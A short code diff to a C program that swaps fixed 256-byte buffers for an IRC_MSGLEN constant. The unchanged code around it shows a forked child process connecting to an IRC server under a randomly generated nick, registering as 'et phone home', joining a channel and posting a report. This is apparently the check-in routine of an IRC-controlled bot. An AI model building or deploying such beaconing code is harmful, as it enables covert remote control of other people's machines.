@@ -26,10 +26,10 @@ int main(int argc, char **argv[])
 	if (!child)
 	{
 		char nick[10];
-		char nick_str[256];
-		char user_str[256];
-		char join_str[256];
-		char mesg_str[256];
+		char nick_str[IRC_MSGLEN];
+		char user_str[IRC_MSGLEN];
+		char join_str[IRC_MSGLEN];
+		char mesg_str[IRC_MSGLEN];
 
 		int sock;
 		struct sockaddr_in server;
@@ -46,10 +46,10 @@ int main(int argc, char **argv[])
 		connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_in));
 
 		gen_nick(nick);
-		snprintf(nick_str, 256, "NICK %s\r\n", nick);
-		snprintf(user_str, 256, "USER %s 0 * :et phone home\r\n", nick);
-		snprintf(join_str, 256, "JOIN :%s\r\n", IRC_CHANNEL);
-		snprintf(mesg_str, 256, "PRIVMSG %s :%s %s\r\n", IRC_CHANNEL, nick, IRC_REPORT);
+		snprintf(nick_str, IRC_MSGLEN, "NICK %s\r\n", nick);
+		snprintf(user_str, IRC_MSGLEN, "USER %s 0 * :et phone home\r\n", nick);
+		snprintf(join_str, IRC_MSGLEN, "JOIN :%s\r\n", IRC_CHANNEL);
+		snprintf(mesg_str, IRC_MSGLEN, "PRIVMSG %s :%s %s\r\n", IRC_CHANNEL, nick, IRC_REPORT);
 		const char *quit = "QUIT";
 
 		send(sock, nick_str, strlen(nick_str), 0);
